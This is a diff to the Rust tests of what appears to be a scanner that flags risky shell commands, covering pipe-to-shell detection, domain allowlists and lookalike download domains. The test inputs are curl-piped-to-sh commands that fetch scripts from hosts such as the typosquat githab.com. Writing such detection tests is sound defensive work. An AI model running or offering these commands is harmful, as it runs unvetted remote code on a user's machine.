@@ -234,7 +234,7 @@ mod tests {
     #[test]
     fn a_command_fetching_two_hosts_has_no_domain_to_match() {
         let allow = allow_domain("command/pipe-to-shell", "example.org");
-        let r = check("curl https://example.org/a https://evil.sh/b | sh", &allow);
+        let r = check("curl https://example.org/a https://zzz.sh/b | sh", &allow);
         assert_eq!(r.findings().len(), 1);
     }
 
@@ -253,6 +253,19 @@ mod tests {
         let allow = allow_domain("command/pipe-to-shell", "example.org");
         let r = check("curl https://cdn.example.org/i.sh | sh", &allow);
         assert_eq!(r.findings().len(), 1);
+    }
+
+    #[test]
+    fn the_lookalike_finding_keeps_its_own_host_when_the_command_fetches_two() {
+        let r = check(
+            "curl https://githab.com/i.sh https://example.org/x | sh",
+            &Allowlists::empty(),
+        );
+        let f = r
+            .findings()
+            .iter()
+            .find(|f| f.rule_id == "command/lookalike-download-domain");
+        assert_eq!(f.and_then(|f| f.domain.as_deref()), Some("githab.com"));
     }
 
     #[test]
